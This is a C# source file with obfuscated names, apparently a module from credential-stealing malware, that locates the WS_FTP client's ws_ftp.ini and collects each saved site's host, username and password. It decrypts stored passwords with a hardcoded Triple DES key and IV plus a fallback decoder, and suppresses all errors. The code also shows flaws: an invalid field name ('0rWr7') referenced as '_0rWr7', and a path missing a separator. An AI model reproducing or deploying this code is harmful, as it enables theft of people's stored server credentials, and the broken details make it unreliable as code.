using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using rCOGWW;

namespace rk937aHHc
{
	public class WS_FTP : EtbH
	{
		public WS_FTP()
		{
			this.BxIfIo86uN = "WS_FTP";
		}

		public string BxIfIo86uN { get; set; }

		public List<WTitxI2m> Grab()
		{
			string path = Environment.GetEnvironmentVariable("appdata") + "Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini";
			List<WTitxI2m> list = new List<WTitxI2m>();

			if (!File.Exists(path))
				return list;

			w3uoxlrf iniParser = new w3uoxlrf();
			iniParser.hM2BAOOJRl(path);

			try
			{
				foreach (string key in iniParser.Keys)
				{
					WTitxI2m entry = new WTitxI2m();

					foreach (string field in iniParser[key].Keys)
					{
						if (field == "HOST")
							entry.data1 = iniParser[key][field].Trim('\\');
						else if (field == "UID")
							entry.data2 = iniParser[key][field]?.Trim('\\');
						else if (field == "PWD" && !string.IsNullOrEmpty(iniParser[key][field]))
						{
							string decrypted = WS_FTP.qXqjV8Mlr5(iniParser[key][field].Trim('\\'));
							entry.data3 = decrypted != null ? decrypted.Trim() : WS_FTP.CXzchppir8(iniParser[key][field]);
						}
					}

					entry.data4 = this.BxIfIo86uN;

					if (!string.IsNullOrEmpty(entry.data2) && !string.IsNullOrEmpty(entry.data3))
						list.Add(entry);
				}
			}
			catch
			{
			}

			return list;
		}

		private static string CXzchppir8(string input)
		{
			try
			{
				string text = input;
				if (!input.Contains("PWD="))
					text = "PWD=" + input;

				string decrypted = "";
				string encodedPart = text.Substring(37); 
				for (int i = 0; i < encodedPart.Length / 2; i++)
				{
					string hexPair = encodedPart.Substring(i * 2, 2);
					string extra = text.Substring(5 + i, 1); 
					int val = Convert.ToInt32(hexPair, 16) - i - 1 - (47 + Convert.ToInt32(extra, 16)) % 57;
					decrypted += (char)val;
				}

				return decrypted;
			}
			catch
			{
				return "";
			}
		}

		private static string qXqjV8Mlr5(string encrypted)
		{
			try
			{
				string data = encrypted;
				if (!string.IsNullOrEmpty(encrypted) && encrypted[0] == '_')
					data = encrypted.Substring(1);

				byte[] cipherBytes = Convert.FromBase64String(data);

				using (TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider())
				{
					tdes.Key = WS_FTP.EHN622C;   
					tdes.IV = WS_FTP._0rWr7;    
					tdes.Mode = CipherMode.CBC;
					tdes.Padding = PaddingMode.None;

					ICryptoTransform decryptor = tdes.CreateDecryptor();
					byte[] plainBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);

					return Encoding.UTF8.GetString(plainBytes);
				}
			}
			catch
			{
				return null;
			}
		}

		private static readonly byte[] EHN622C = new byte[]
		{
			225,
			240,
			195,
			210,
			165,
			180,
			135,
			150,
			105,
			120,
			75,
			90,
			45,
			3,
			15,
			30,
			52,
			18,
			120,
			86,
			171,
			144,
			239,
			205
		};

		private static readonly byte[] 0rWr7 = new byte[]
		{
			52,
			18,
			120,
			86,
			171,
			144,
			239,
			205
		};
	}
}
